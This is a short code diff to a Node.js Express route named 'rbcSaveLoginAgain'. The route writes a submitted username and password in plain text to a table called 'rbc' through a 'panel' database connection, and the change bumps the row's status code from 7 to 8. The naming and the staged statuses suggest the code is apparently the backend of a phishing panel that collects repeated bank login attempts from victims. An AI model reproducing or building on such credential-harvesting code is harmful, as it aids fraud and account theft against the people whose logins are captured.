@@ -2164,7 +2164,7 @@ app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
   password = req.body.password;
 
   let details = [username, password, uniqueid];
-  let query = `UPDATE rbc SET username= ?, password= ?, status = 7 WHERE uniqueid = ?`;
+  let query = `UPDATE rbc SET username= ?, password= ?, status = 8 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
